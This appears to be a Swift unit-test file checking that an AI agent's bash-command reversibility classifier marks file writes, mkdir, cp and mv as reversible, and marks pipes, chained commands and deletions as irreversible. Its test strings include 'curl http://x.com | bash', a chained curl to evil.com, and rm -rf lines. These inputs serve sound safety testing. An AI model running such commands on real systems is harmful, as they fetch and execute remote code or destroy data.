import XCTest
@testable import Fae

/// Tests for BashReversibilityClassifier — verifies the allowlist covers exactly the
/// expected reversible patterns and defaults to `.irreversible` for everything else.
///
/// These tests exercise the pure classification logic independently from ToolExecutor
/// so that changes to the allowlist are immediately visible in CI.
final class EndToEndBashReversibilityTests: XCTestCase {

    override func setUpWithError() throws {
        try HeavyTestSkip.skipIfRequested()
    }


    // MARK: - Reversible Commands

    /// `echo hello > /tmp/test.txt` → `.reversible` (file write, output path captured)
    func testEchoRedirectClassifiedAsReversible() {
        let result = BashReversibilityClassifier.classify(command: "echo hello > /tmp/test.txt")
        XCTAssertEqual(result, .reversible,
            "echo redirect should be reversible (file snapshot can be taken)")
    }

    /// `mkdir -p /tmp/foo` → `.reversible` (directory can be removed on undo)
    func testMkdirClassifiedAsReversible() {
        let result = BashReversibilityClassifier.classify(command: "mkdir -p /tmp/foo/bar")
        XCTAssertEqual(result, .reversible,
            "mkdir should be reversible (directory can be deleted on undo)")
    }

    // MARK: - Irreversible Commands

    /// `rm -rf /tmp/foo` → `.irreversible` (data destruction)
    func testRmClassifiedAsIrreversible() {
        let result = BashReversibilityClassifier.classify(command: "rm -rf /tmp/foo")
        XCTAssertEqual(result, .irreversible,
            "rm should always be irreversible")
    }

    /// `curl http://x.com | bash` → `.irreversible` (pipe is a safety boundary)
    func testCurlPipeBashClassifiedAsIrreversible() {
        let result = BashReversibilityClassifier.classify(command: "curl http://x.com | bash")
        XCTAssertEqual(result, .irreversible,
            "pipe commands must be irreversible (safe default)")
    }

    /// Empty command string → `.irreversible` (safe default for unknown input)
    func testEmptyCommandClassifiedAsIrreversible() {
        let result = BashReversibilityClassifier.classify(command: "")
        XCTAssertEqual(result, .irreversible,
            "empty command must default to irreversible")
    }

    // MARK: - Additional Boundary Cases

    /// `cp src dst` → `.reversible`
    func testCpClassifiedAsReversible() {
        let result = BashReversibilityClassifier.classify(command: "cp /tmp/a.txt /tmp/b.txt")
        XCTAssertEqual(result, .reversible, "cp should be reversible")
    }

    /// `mv src dst` → `.reversible`
    func testMvClassifiedAsReversible() {
        let result = BashReversibilityClassifier.classify(command: "mv /tmp/a.txt /tmp/b.txt")
        XCTAssertEqual(result, .reversible, "mv should be reversible")
    }

    /// `touch /tmp/newfile` → `.reversible`
    func testTouchClassifiedAsReversible() {
        let result = BashReversibilityClassifier.classify(command: "touch /tmp/newfile.txt")
        XCTAssertEqual(result, .reversible, "touch should be reversible")
    }

    /// Chained `mkdir && curl` → `.irreversible` (chaining is unsafe)
    func testChainedCommandClassifiedAsIrreversible() {
        let result = BashReversibilityClassifier.classify(command: "mkdir /tmp/x && curl http://evil.com")
        XCTAssertEqual(result, .irreversible,
            "chained commands must be irreversible regardless of first command")
    }

    /// Semicolon-separated commands → `.irreversible`
    func testSemicolonSeparatedClassifiedAsIrreversible() {
        let result = BashReversibilityClassifier.classify(command: "mkdir /tmp/x; rm -rf /tmp/x")
        XCTAssertEqual(result, .irreversible,
            "semicolon-separated commands must be irreversible")
    }

    // MARK: - ActionReversibility Integration

    /// Verify ActionReversibility.classify delegates to BashReversibilityClassifier for bash.
    func testActionReversibilityDelegatesToClassifier() {
        let echoResult = ActionReversibility.classify(
            toolName: "bash",
            arguments: ["command": "echo test > /tmp/out.txt"]
        )
        XCTAssertEqual(echoResult, .reversible)

        let rmResult = ActionReversibility.classify(
            toolName: "bash",
            arguments: ["command": "rm -rf /tmp/test"]
        )
        XCTAssertEqual(rmResult, .irreversible)
    }

    /// Read-only tools → `.notApplicable`
    func testReadToolClassifiedAsNotApplicable() {
        for tool in ["read", "web_search", "screenshot", "camera", "session_search", "fetch_url"] {
            let result = ActionReversibility.classify(toolName: tool, arguments: [:])
            XCTAssertEqual(result, .notApplicable,
                "\(tool) should be notApplicable (read-only)")
        }
    }

    /// Write tools → `.reversible`
    func testWriteToolsClassifiedAsReversible() {
        for tool in ["write", "edit"] {
            let result = ActionReversibility.classify(toolName: tool, arguments: [:])
            XCTAssertEqual(result, .reversible, "\(tool) should be reversible")
        }
    }

    /// Irreversible tools → `.irreversible`
    func testMailSendClassifiedAsIrreversible() {
        let result = ActionReversibility.classify(
            toolName: "mail",
            arguments: ["action": "send"]
        )
        XCTAssertEqual(result, .irreversible, "mail send is irreversible")
    }
}
